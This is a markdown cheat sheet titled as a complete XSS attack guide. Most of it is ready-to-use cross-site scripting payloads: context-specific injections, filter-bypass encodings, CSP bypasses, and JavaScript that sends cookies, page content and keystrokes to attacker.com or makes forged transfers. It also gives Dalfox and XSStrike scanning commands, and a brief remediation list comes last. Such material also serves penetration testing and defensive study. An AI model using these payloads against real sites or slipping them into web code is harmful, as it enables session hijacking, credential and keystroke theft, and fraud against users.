# XSS — Complete Attack Guide

## 1. Types

### 1.1 Reflected XSS
```
http://target/search?q=<script>alert(1)</script>
http://target/page?name=<img src=x onerror=alert(1)>
```

### 1.2 Stored XSS
```
POST /comment
body=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

### 1.3 DOM-Based XSS
```
http://target/page#<script>alert(1)</script>
http://target/page?redirect=javascript:alert(1)
```

## 2. Payloads by Context

### 2.1 HTML Context
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<iframe src=javascript:alert(1)>
```

### 2.2 Attribute Context
```
" onmouseover=alert(1) "
' onfocus=alert(1) autofocus '
" autofocus onfocus=alert(1) "
" onload=alert(1) "
```

### 2.3 JavaScript Context
```javascript
';alert(1);//
";alert(1);//
</script><script>alert(1)</script>
-alert(1)-
{{constructor.constructor('alert(1)')()}}
```

### 2.4 URL Context
```javascript
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

## 3. Filter Bypass

### 3.1 Tag Case
```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>
```

### 3.2 Encoding
```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>
<img src=x onerror=alert&#40;1&#41;>
```

### 3.3 Double Encoding
```
%253Cscript%253Ealert(1)%253C/script%253E
```

### 3.4 Null Bytes
```
<scr%00ipt>alert(1)</script>
```

### 3.5 SVG
```html
<svg/onload=alert(1)>
<svg><script>alert(1)</script></svg>
```

### 3.6 Event Handlers
```html
<img src=x onerror=alert`1`>
<details open ontoggle=alert(1)>
<div onmouseover=alert(1)>hover me</div>
```

### 3.7 Template Literals
```javascript
${alert(1)}
${constructor.constructor('alert(1)')()}
```

## 4. Advanced Techniques

### 4.1 CSP Bypass
```
# If CDN is allowed in CSP
<script src="https://cdn.jsdelivr.net/npm/mathjs@7.0.0/lib/browser/math.js"></script>
<script>math.import({x:alert});math.evaluate('x(1)')'</script>

# If Google Analytics is allowed
<img src=x onerror="ga('send','event','x','x','x');alert(1)">
```

### 4.2 HTTP-Only Cookie Bypass
```javascript
// Can't read cookies directly, but can:
// 1. Perform actions on behalf of user
fetch('/api/transfer', {method:'POST', body:'to=attacker&amount=1000'})

// 2. Exfiltrate page content
fetch('https://attacker.com/exfil', {body: document.body.innerHTML})

// 3. Keylogging
document.onkeypress = function(e) { fetch('https://attacker.com/keys?key='+e.key) }
```

### 4.3 Session Hijacking
```javascript
// Steal session via WebSocket
var ws = new WebSocket('ws://attacker.com');
ws.onopen = function() { ws.send(document.cookie); };

// Steal via image
new Image().src = 'https://attacker.com/steal?c=' + document.cookie;
```

## 5. Tools

### Dalfox
```bash
dalfox url "http://target/page?q=FUZZ" -o results.txt
dalfox file urls.txt --blind "https://attacker.com"
```

### XSStrike
```bash
xsstrike -u "http://target/page?q=test"
```

## 6. Remediation

1. **Output encoding** — HTML entity encoding for HTML context, JS encoding for JS context
2. **Content Security Policy (CSP)** — Restrict script sources
3. **HTTPOnly cookies** — Prevent JS access to session cookies
4. **Input validation** — Whitelist allowed characters
5. **Framework auto-escaping** — React, Vue, Angular auto-escape by default
